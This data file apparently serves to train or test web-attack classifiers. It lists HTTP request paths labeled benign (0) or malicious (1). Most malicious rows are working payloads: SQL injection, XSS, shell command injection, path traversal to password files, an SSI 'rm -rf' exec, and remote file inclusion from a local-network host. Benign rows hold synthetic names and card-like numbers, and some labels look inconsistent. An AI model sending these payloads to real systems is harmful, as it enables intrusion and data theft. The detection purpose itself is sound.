request	label
/ ottomatic / 	0
/ en-us / account / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl 	1
/ javascript / peek . db 	0
/ s7qus4g3 . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ pr20020211a / 	0
/ spitemalice / 	0
/ minolta / 	0
/ string / modo = registro & login = westfall & password = cal5br2 & nombre = laurencia & apellidos = flo + hosta & email = cusanelli @ wdsl . ao & dni = 91704360w & direccion = calle + juan + valera + 97 + 12d & ciudad = cuevas + de + san + clemente & cp = 31410 & provincia = navarra & ntc = 0945727443543584 & b1 = registrar 	0
/ dot4logo / 	0
/ net-tools / 	0
/ 049727 / 	0
/ javascript / pm . csv 	0
/ string / strings / parameters = 18898337l 	0
/ msg10912540 / 	0
/ javascript / 11 . config 	0
/ string / modo = entrar & login = deagle & pwd = i91ro21rc197a1o & remember = off & b1 = entrar 	0
/ loader_06 / 	0
/ javascript / change . tar . bz2 	0
/ glossary-t / 	0
/ string / modo = insertar & precio = 7896 & b1 = pasar + por + caja 	0
/ 1991325icownersmanual / 	0
"/ string / strings / parameters = -9166 ""  ""  )  as hlre where 4768 = 4768 or 5903 =  (  ' qqpjq '  |  |  ( select case 5903 when 5903 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  -- "	1
/ string / strings / parameters = villazn peters 	0
/ top . php ? stuff =  '  | sleep 10  # 	1
/ string / strings / parameters = d_eslechar 	0
/ 1005f1d_tn / 	0
/ funknots / 	0
/ ports12000to12099 / 	0
"/ string / strings / parameters = < body onresize body onresize =  "" javascript : javascript : alert ( 1 )  ""  >  <  / body onresize > "	1
/ string / strings / parameters = 60201082p 	0
/ string / strings / parameters = '  ; echo bxndag $  (  ( 17 + 65 )  )  $  ( echo bxndag ) bxndag /  / 	1
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo xtmpbt )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  | "	1
/ 64bitpatching / 	0
/ sibelius_2 / 	0
/ string / strings / parameters = todito 	0
/ script / tick / test . php ? path_to_code = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ? 	1
/ 158296 / 	0
/ string / strings / parameters = 23628 	0
/ javascript / technical . exe 	1
/ string / strings / parameters = ashla 	0
/ string / strings / parameters = cabaeros ,  131 	0
"/ string / strings / parameters = ""  &  sleep 0  &  &  str =  $  ( echo riizgu )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  ' "	1
/ string / modo = entrar & login = petruck & pwd = desnudez & remember = off & b1 = entrar 	0
/ string / strings / parameters = mandrial 	0
/ string / strings / parameters = 1 )  )  or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  and  (  ( 8554 = 8554 	1
/ string / strings / parameters = 0 ^  ( locate ( 0x61 ,  ( select id from users where num = 1 )  , 1 )  = 1 ) 	1
/ string / id =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -- 	1
/ string / strings / parameters = 09491 	0
/ javascript / soap . tar . bz2 	0
/ string / strings / parameters = baigent @ blueberryminiloaf . com . dj 	0
/ s42dea / 	0
"/ main . php ? logout =  ""  & del , q76194966 & rem , "	1
/ string / strings / parameters = baumgarten bagudanc 	0
/ string / strings / parameters = arquitectnico 	0
/ main . php ? logout =  /  ' 	1
/ javascript / intelligence . conf 	0
/ javascript / baskets . gif 	0
/ blackandwhite / 	0
/ string / strings / parameters = ;  str =  $  ( echo pohuxh )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  # 	1
"/ pxagj7n7 . asp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ header-welcome / 	0
/ a1 audio ripper v1 / 	0
"/ help . php ? q =  ""  & ping ; -w ; 9000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ; "	1
/ string / strings / parameters = milka 	0
/ string / strings / parameters = remberta 	0
/ main . php ? stuff = ver \ xa0 > q67222935 & rem \ xa0 	1
/ logo-fstc / 	0
/ string / modo = insertar & precio = 8169 & b1 = confirmar 	0
/ en-us / account / include / sql . php ? include_path =  / etc / passwd \ x00 	1
"/ ao22ww7y . jsp ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 '  )  )  )  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  ' narn '  =  ' narn 	1
/ string / strings / parameters = 1 )  )  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
/ string / modo = insertar & precio = 3349 & b1 = confirmar 	0
/ string / modo = insertar & precio = 74 & b1 = pasar + por + caja 	0
/ string / strings / parameters = cenicientos 	0
/ nuh3zirz . jsp ?  < script > cross_site_scripting . nasl <  / script > 	1
"/ scripts / search . jsp ? q =  %  ""  < script > alert ( 1332010405 )  <  / script > "	1
/ quote-left / 	0
/ c20174 / 	0
/ transparent_space / 	0
/ javascript / spy . out 	0
/ lobster-tutorial / 	0
/ examples / jsp / checkbox / texis . exe / nessus 	1
/ ny1b3qq4 . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 70132648j 	0
/ javascript / showmap . jpg 	0
/ activitys / 	0
/ javascript / baz . exe 	1
/ string / modo = insertar & precio = 5798 & b1 = confirmar / 	1
/ cacti / index . php ? chemin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc 	1
/ beautyess / 	0
"/ string / strings / parameters = ""  ;  str =  $  ( echo kgcqcv )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi "	1
/ javascript / copyright . tar . bz2 	0
/ string / strings / parameters = firestone @ artforall . ag 	0
/ javascript / mambo . temp 	0
/ 20061102-1 / 	0
/ javascript / php . dump 	0
/ string / strings / parameters = amaranta 	0
/ string / strings / parameters = 1 '  and make_set ( 9860 = 6956 , 6956 )  and  ' toru '  =  ' toru 	1
/ javascript /  . htpasswd . sfish / -2147483649 	1
/ order / login . php ? svr_rootscript = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ? 	1
/ what ' snew / 	1
/ snmpmonitorex-1 / 	0
/ opensiteadmin / scripts / classes / form . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / whmch8ftkt7kv ?  \ x00 	1
"/ string / strings / parameters = 1 ""  ""  )  as ebvt where 5305 = 5305 ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- "	1
/ lib / db / postgres . class . php ? root = xxpathxx 	1
/ string / strings / parameters = objio 	0
"/ scs86g1p . pl ?  < script > document . cookie =  "" testquyx = 2820 ;  ""  <  / script > "	1
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad = 4 & b1 = aadir + al + carrito 	0
/ webjrsparty-small / 	0
"/ en-us / i686v90l . kspx ?  < meta http-equiv = set-cookie content =  "" testfutf = 1550 ""  > "	1
"/ zv8tv7h8 . fts ?  < meta http-equiv = set-cookie content =  "" testcqwz = 9752 ""  > "	1
/ javascript / _adm . rar 	0
/ 1931836973 / 	0
/ help . php ? q =  & ver \ x0c > q36742672 & rem \ x0c 	1
/ javascript / signer . zip 	0
"/ zabbix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  ""  . system (  ' chmod + 777 +  / tmp / tvwonjvwux . sh '  )  .  ""  ]  = 1 "	1
/ satyrs / 	0
/ string / strings / parameters = inviolada 	0
/ contenido_4 . 8 . 4 / contenido / cronjobs / setfrontenduserstate . php ? cfg [ path ]  [ contenido ]  = xxpathxx ? 	1
/ urban species - blanket / 	0
/ string / modo = registro & login = humfrey & password = e23i6gulo & nombre = nicolo & apellidos = brines + grimalda & email = floor @ aebo . af & dni = 88341714w & direccion = calle + hernan + cortes ,  + 58 ,  +  & ciudad = pelarrodrguez & cp = 29639 & provincia = cantabria & ntc = 0052422482512057 & b1 = registrar 	0
/ top . php ? stuff =  '  \ x0ddel \ x09q15742122 \ x09 # 	1
/ scripts / modules / tinymce / content_css . php ? templateid = -1 /  *  *  / union /  *  *  / select /  *  *  / 1331904243 , 1 , 1681261181 -- 	1
/ agora_path /  / mdweb / admin / inc / organisations / country_insert . php ? chemin_appli = xxpathxx ? 	1
/ javascript / pub . exe 	1
/ advsearch / 	0
/ steganos internet trace destructor 7 / 	0
"/ string / strings / parameters = |   [  2 -ne  $  ( echo znvkix  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ javascript / reporting . exe 	1
/ string / strings / parameters = 1 '  +  ( select xlvq where 7470 = 7470 and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  )  +  ' 	1
/  \ xd0 \ x97 \ xd0 \ xb4 \ xd0 \ xbe \ xd1 \ x80 \ xd0 \ xbe \ xd0 \ xb2 '  \ xd1 \ x8f / 	1
/ string / strings / parameters = and  ( select substring (  @  @ version , 3 , 1 )  )  =  ' c ' 	1
/ javascript / pbo . svn-base 	0
/ ohio_warren / 	0
/ datasheet_dsktpmngr / 	0
/ nwc_squire / 	0
"/ string / strings / parameters = 1 ""  ""  )  where 2680 = 2680 or elt ( 5873 = 5873 , sleep ( 5 )  )  # "	1
/ string / id = 1 & nombre = jamn + ibrico & precio = 100 & cantidad = 5 & b1 = aadir + al + carrito 	0
/ 138106 / 	0
/ string / modo = registro & login = ferne & password = pech + e & nombre = roth & apellidos = guinea + hinojar & email = milani4 @ beautifulbody . sh & dni = 89208475p & direccion = calle + venus ,  + 81 + 2-a & ciudad = endrinal & cp = 39806 & provincia = guadalajara & ntc = 8417338456175136 & b1 = registrar 	0
/ string / strings / parameters = 1 '  where 6905 = 6905 union all select null , null , null , null , null , null # 	1
"/ string / strings / parameters = | echo $ ifsxhrrau $  (  ( 47 + 66 )  )  $  ( echo $ ifsxhrrau ) xhrrau "" "	1
/ 2346872630061120271hduwdz_th / 	0
"/ en-us /  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  >  . kspx "	1
"/ string / strings / parameters = -2725 ""  ""  union all select 3671 , 3671 , 3671 , 3671 , 3671 # "	1
/  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  { file } 	1
/ string / strings / parameters = -4617 '  )  )  )  or 9323 = 9323 # 	1
/ cgi-914 / windmail . exe 	1
/ test . php ? evalme = eval (  $ _server [ http_x_popbgbkzviejo ]  )  ; 	1
/ string / strings / parameters = extremosa 	0
/ string / strings / parameters = passatge permanyer ,  53 ,  7d 	0
/ string / strings / parameters = < textarea autofocus onfocus = alert ( 1 )  > 	1
/ dsniff-1 / 	0
/ 86ae9a486cf3 / 	0
/ javascript / exchange . php 	0
/ index . php ? module = topics & func = view & topicid = -1 union select null , null ,  ' mdpro_topicid_sql_injection . nasl-1331919183 '  , null , null , null , null  -- 	1
/ javascript / oa . cnf 	0
/ string / strings / parameters = ;  str =  $  ( echo qiikmd )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
"/ string / modo = insertar & precio =  <  !  --  # include + file =  "" archivo_secreto ""  +  --  >  & b1 = pasar + por + caja "	1
/ javascript / digest . jsf 	0
/ mar2006 / 	0
/ plhm_recby / 	0
/ 0603_archive / 	0
"/ 0z575z74 . php3 ?  < meta http-equiv = set-cookie content =  "" testuhsv = 9753 ""  > "	1
/ string / id = 2 & nombre = vino + rioja & precio = 100 /  & cantidad = 25 & b1 = aadir + al + carrito 	1
"/ ju0u7kfo . fts ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ cgi-bin / search . jsp ? q =  %  ""  < script > alert ( 1332010405 )  <  / script > "	1
/ 2006a0719_mac-unitsgrow / 	0
/ d05357t / 	0
"/ zqqemp6j . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 126856 / 	0
/ string / strings / parameters = \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ etc \ shadow	1
/ examples / jsp / error / awstatstotals . php ? sort =  {  $  { passthru ( chr ( 105 )  . chr ( 100 )  )  }  }  {  $  { exit (  )  }  } 	0
"/ ht8pn8uq . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ msadm / user / login . php3 ? account_name =  \  ""  >  < script > alert (  ' vulnerable '  )  <  / script > "	1
/ cacti / index . php ? id = mumrj3sj0o ' 	1
/ wilderswinterlogo2006 / 	0
/ string / b2 = vaciar + carrito @ 40 	1
/ string / strings / parameters = < iframe /  *  %  %  %  %  %  %  %  *  / src =  ' javascript : vbscript :   /  *  *  /  ;  /  /  : http :  /  / www . google . com /  ?  =   /  *  *  / javascript :   /  * oleeeeeeeeeeeeeee *  / alert ( 2 )  ;  '  > 	1
"/ string / strings / parameters = -1 < div onmouseover =  ""  "" document . cookie = true ;  ""  ""  > "	1
/ en-us / account / new-visitor . inc . php ? lvc_include_dir = http :  /  / xxxxxxxx 	0
/ kh_flag / 	0
/ phishing_hooks / 	0
/ string / strings / parameters = valpalmas 	0
/ string / strings / parameters = or 1 = 1  -- 	1
"/ string / strings / parameters = 1 ""  ""  procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 ) "	1
/ string / modo = registro & login = toperzer1 & password = sufragio & nombre = oziel & apellidos = mar + mendivil & email = rattenbury_roquette @ ibizasounds . gh & dni = 69539711q & direccion = calle + ecuador + 143 +  & ciudad = gallegos + de + argan & cp = 03580 & provincia = toledo & ntc = 1940931931153821 & b1 = registrar 	0
/ rent commercial / 	0
/ string / id = 1 @ 40 	1
/ commentthumbdowndisabled / 	0
/ http :  /  / ddanchev / 	0
/ esecurity / 	0
/ string / strings / parameters = | echo $ ifsimxnsu $  (  ( 31 + 19 )  )  $  ( echo $ ifsimxnsu ) imxnsu & 	1
/ string / strings / parameters = 1 '  )  union all select null , null , null , null , null , null , null , null -- 	1
"/ string / strings / parameters = 1 ""  ""  )  ; select benchmark ( 5000000 , md5 ( 0x714e4153 )  )  # "	1
/ 113566 / 	0
/ javascript / jhtml . sfish 	0
/ string / strings / parameters = colrico 	0
/ string / strings / parameters = derch mallol 	0
/ quicky / 	0
/ v14893265 / 	0
/ ows-bin / sensepost . exe ?  / c + dir 	1
/ sitemanager / 	0
/ phpmyadmin /  /  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ etc / passwd 	1
/ javascript / gateway . xls 	0
/ 1004354936 / 	0
/ fattutorial-seamons / 	0
/ javascript / sections . doc 	0
/ javascript / ibm . tar . bz2 	0
/ string / strings / parameters = marysia-paramor @ programaciones . com . mg 	0
/ javascript / declarations . png 	0
/ examples / jsp / cal / zml . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ t10848 / 	0
/ string / modo = entrar & login = guillory & pwd = arme ! lluela & remember = on & b1 = entrar 	0
/ awzmb / modules / core / core . incl . php ? setting [ opt_includepath ]  = xxpathxx 	1
"/ fc9t54l7 . idc ?  < meta http-equiv = set-cookie content =  "" testggad = 2000 ""  > "	1
"/ string / strings / parameters = '   str =  $  ( echo ggpyar )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "" "	1
/ dir_106 / 	0
/ examples / jsp / error / index . pl / homels ? func = add ; class = webgui :  : asset :  : wobject :  : article ; print  ` id `  ; 	1
"/ main . php ? logout =  ""  & del \ x0bq42433487 & rem \ x0b "	1
/ krajobrazy0073 / 	0
/ string / strings / parameters = funderbu 	0
/ examples / jsp / jsp2 / jspx / webdist . cgi ? distloc =  ; id 	1
/ nsn /  .  .  \ util / del . bas 	1
"/ string / strings / parameters = -8868 ""  ""  )  where 5681 = 5681 union all select 5681 , 5681 , 5681 , 5681 , 5681 , 5681 , 5681 , 5681 , 5681 , 5681 -- "	1
/ string / strings / parameters = ayar 	0
/ 103454 / 	0
/ dsa-1042 / 	0
/ 874559 / 	0
/ 642798 / 	0
"/ string / strings / parameters = ""  |   [  3 -ne  $  ( echo tiqlnl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' "	1
/ q64118446 	0
/ string / modo = registro & login = frederiq  & password = carian ? cha & nombre = refael & apellidos = jan + alomar & email = taylor-young @ esposa . com . mu & dni = 78433382r & direccion = calle + jose + maria + castao + 16 +  & ciudad = villores & cp = 49740 & provincia = cuenca & ntc = 1302864745707102 & b1 = registrar 	1
/ 4440763382494872758 / 	0
/ string / strings / parameters = gilan @ escarba . fk 	0
/ zmvq66jy . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ svc02_small / 	0
/ cgi-bin / directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  union all select null # 	1
"/ examples / jsp / error / nessus ""  >  < script > alert (  ' django_admin_xss . nasl '  )  <  / script >  / "	1
/ string / strings / parameters = & echo iwrtxc $  (  ( 50 + 84 )  )  $  ( echo iwrtxc ) iwrtxc 	1
/ _vti_bin / shtml . exe ? _vti_rpc 	1
"/ en-us / 9kr0ih0v . jsp ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
/ string / id = 3 & nombre = vino + rioja & precio = any ?   set-cookie :  + tamper = 1041264011025374727   & cantidad = 11 & b1 = aadir + al + carrito 	1
/ ny1b3qq4 . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 2408850 / 	0
"/ string / strings / parameters = ""  '  >  < script > confirm ( 1 )  <  / script >  ""  , "	1
/ 05winter_haqqani / 	0
/ string / strings / parameters = caminero carreo 	0
/ mfsa2006-71 / 	0
/ a750597 / 	0
/ directpush / 	0
"/ string / strings / parameters = 1 ""  ""  or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  ) "	1
/ javascript / mta . cfg 	0
"/ string / strings / parameters = < style type =  "" text / javascript ""  > confirm ( document . location )  ;  <  / style > "	1
/ string / strings / parameters = tortolito 	0
/ 144394 / 	0
/ phpmyadmin / phf ? qalias = x \ x0a / bin / cat  / etc / passwd 	1
/ string / strings / parameters = 1 '  )  )  ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual and  (  (  ' fnna '  =  ' fnna 	1
"/ string / strings / parameters = >  ""  ""  < body onload =  ""  "" document . cookie = true ;  ""  ""  > "	1
/ 168885 / 	0
/ string / strings / parameters = |   [  5 -ne  $  ( echo ftwokg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ niet2053230067 . php3 	0
/ infobox_e1 / 	0
"/ byrg33fw . mscgi ?  < meta http-equiv = set-cookie content =  "" testexuu = 5340 ""  > "	1
/ string / strings / parameters = 1 )  )  )  order by 1 # 	1
/ string / strings / parameters = c /  antonio momplet 114 	0
"/ g8nu2yy7 . jsp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / controller . sql 	0
/ javascript / priv . ws 	0
/ string / strings / parameters = rehbein 	0
/ string / modo = insertar & precio = 2814 & b1 = pasar + por + caja / 	1
/ string / modo = registro & login = betty-an5 & password = mo9qu0ado & nombre = petunia & apellidos = ivern & emaila = veazie-bolin @ tiaherminia . tj & dni = 32245892f & direccion = calle + luis + piernas + 86 + 11-e & ciudad = gerindote & cp = 46443 & provincia = almera & ntc = 8173244424971818 & b1 = registrar 	1
/ string / strings / parameters = 1 )  where 4866 = 4866 ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  -- 	1
/ q52853568 	0
/ 136536 / 	0
/ string / strings / parameters = etorbidea atarrabiako 126 ,  5d 	0
"/ ewc3rz1l . cfm ?  < meta http-equiv = set-cookie content =  "" testkgqo = 204 ""  > "	1
/ page_1 / 	0
/ javascript / errors . yml 	0
/ string / strings / parameters = echo kbnmcf $  (  ( 63 + 18 )  )  $  ( echo kbnmcf ) kbnmcf 	1
/ string / strings / parameters = &  & echo $ ifssuktvk $  (  ( 49 + 30 )  )  $  ( echo $ ifssuktvk ) suktvk 	1
/ examples / jsp / checkbox / atomicboard / index . php ? location =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
"/ main . php ? stuff =  "" ver \ x0c > q36356367 & rem \ x0c "	1
/ invader zim 2 dvd set / 	0
/ control_print / 	0
/ moda-le_tatouage / 	0
/ cote '  content / 	1
/ string / modo = registro & login = katja & password = habilitador & nombre = bastian & apellidos = urigoiti + unzaga & email = navartil @ soyandaluz . va & dni = 78433382r & direccion = passatge + cala + ratjada + 127 ,  +  & ciudad = hontoria + del + pinar & cp = 50142 & provincia =  /  ? seg + ovia & ntc = 6142248987618034 & b1 = registrar 	1
/ string / strings / parameters = 1 )  )  as rroe where 4840 = 4840 ; select  *  from generate_series ( 3607 , 3607 , case when  ( 3607 = 4242 )  then 1 else 0 end )  limit 1 -- 	1
/ msg332616 / 	0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo bodwqd )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  /  / 	1
"/ string / strings / parameters = -9136 %  ""  ""  )  union all select 3081 , 3081 , 3081 , 3081 , 3081 , 3081 , 3081 # "	1
/ eel ' s cptech site / 	1
/ javascript / index1 . dump 	0
/ stock_warehouse / 	0
/ string / strings / parameters = 1 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  #  ehsr 	1
/ icash_v3 / 	0
/ string / strings / parameters = puri @ espaciodelpintor . er 	0
/ string / str =  $  ( echo ljkrdd )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' 	1
/ string / modo = registro & login = caleta & password = carminante & nombre = reinaldo & apellidos = homs + breither & email = patric_congregation @ annoyanc . zr & dni = 54180440f & direccion = calle + jabera ,  + 27 ,  +  & ciudad = fuentes + calientes & cp = 47185 & provincia = valencia & ntc = 9828908323300958 & b1 = registrar 	0
/ 678soft / 	0
/ javascript / srv . tmp 	0
/ b8109-90007 / 	0
/ string / modo = registro & login = bronny & password = probtica & nombre = herodes & apellidos = canal + saracho & email = delit @ icods . ro & dni = 30034324g & direccion = soldado + isern + comas ,  + 163 +  & ciudad = fisterra & cp = 50786 & provincia = mlaga & ntc = 6646364867316406 & b1 = registrar 	0
/ string / strings / parameters = 1 '  )  )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  (  (  ' cbaj '  =  ' cbaj 	1
/ taulvcvfro . exe 	1
/ 400199 / 	0
/ 2000-q1 / 	0
/ cryptolo / 	0
/ manager / config . php ? path [ docroot ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = olmos ,  los 	0
/ top . php ? stuff =  '  \ x0adel \ x09q23871271 \ x09 # 	1
/ string / strings / parameters = miner @ zing . lk 	0
/ pmax-pro / 	0
/ string / strings / parameters = sant andreu salou 	0
"/ y8pmygrp . mscgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / key . 7z 	0
"/ string / modo = registro & login = tebinka & password = bicoqun & nombre = beshara & apellidos = medio + bullones & email = miravalles_kaa @ castigadas . tm & dni =  <  !  --  # exec + cmd =  "" rm + -rf +  /  ; cat +  / etc / passwd ""  +  --  >  & direccion = pl .  + durcal ,  + 141 ,  +  & ciudad = camarenilla & cp = 21240 & provincia = huelva & ntc = 5144167134274894 & b1 = registrar "	1
/ recoverpassword / 	0
/ string / str =  $  ( echo zphyvs )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ string / modo = entrar & login = linnet & pwd = co ' ngrega / ci , n & remember = off & b1 = entrar 	1
/ 112791 / 	0
/ examples / jsp / num / phpnews / sendtofriend . php ? mid =  ' 1 ' 	1
/ w32rbotws / 	0
/ string / strings / parameters = ;  str =  $  ( echo ojgbkf )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ string / strings / parameters = agnac5n 	0
/ novell-167exh / 	0
/ string / strings / parameters = 00041731d 	0
/ string / strings / parameters = < svg onload = evt . target [  / innerht /  . source +  / ml /  . source ]  = evt . target [  / ownerdocumen /  . source +  / t /  . source ]  [  / u r /  . source +  / l /  . source ]  #  < img src =  /  onerror = alert ( domain )  > 	1
/ string / modo = registro & login = warriner & password = intern5r & nombre = perpetuo & apellidos = las + gijn & email = hanisch @ todobetis . mm & dni = 95417371p & direccion = santa + leonor ,  + 187 ,  + 7 ? h & ciudad = gata & cp = 12413 & provincia = a + corua & ntc = 3301556997832091 & b1 = registrar 	0
/ 606wkcop . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = | echo $ ifsgfloua $  (  ( 7 + 71 )  )  $  ( echo $ ifsgfloua ) gfloua ' 	1
/ string / strings / parameters = t31331 	0
/ string / strings / parameters = echo $ ifsbuiolu $  (  ( 83 + 61 )  )  $  ( echo $ ifsbuiolu ) buiolu ' 	1
/ javascript / wp . tmp 	0
/ string / strings / parameters = 1 and 6414 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  #  hlrg 	1
/ string / id = 3 & nombre = jamn + ibrico & precio = 100 ' injected_param & cantidad = 38 & b1 = aadir + al + carrito 	1
/ 171807 / 	0
/ string / strings / parameters = rudisill8 	0
/ string / strings / parameters = 31281 	0
/ string / strings / parameters = 51858384p 	0
/ string / strings / parameters = mayolas 	0
/ tina_li / 	0
/ string / id = 3 & nombre = jamn + ibrico & precio = 39 & cantidad =  ' or ' a =  ' a & b1 = aadir + al + carrito 	1
/ string / strings / parameters = addetia 	0
/ help . php ? q = del ; q21957336 & rem ; 	1
/ string / strings / parameters = nahmias 	0
/ javascript / mdb . exe 	1
/ string / strings / parameters = elysia 	0
/ cgi-bin / cal_event . php ? id = 1 '  union select 1 , 2 ,  ' calendarix_id_sql_injection . nasl '  , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 -- 	1
/ examples / jsp / cal / story . pl ? next =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ cgi-bin / login . php ? user =  ""  >  < script > alert (  ' pubcookie_xss . nasl '  )  ;  <  / script > "	1
/ 000118404 / 	0
/ javascript / medium . cgi 	0
/ string / strings / parameters = bic9spide 	0
/ instree / 	0
/ nmw0do67 . x ?  < script > cross_site_scripting . nasl <  / script > 	1
